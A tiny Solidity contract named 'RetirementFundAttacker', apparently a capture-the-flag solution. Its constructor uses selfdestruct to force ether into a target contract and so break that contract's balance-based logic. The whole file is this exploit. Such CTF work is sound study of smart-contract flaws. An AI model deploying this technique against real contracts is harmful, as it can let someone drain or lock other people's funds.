pragma solidity ^0.7.3;

contract RetirementFundAttacker {
    
    constructor (address payable target) payable {
        require(msg.value > 0);
        selfdestruct(target);
    }
}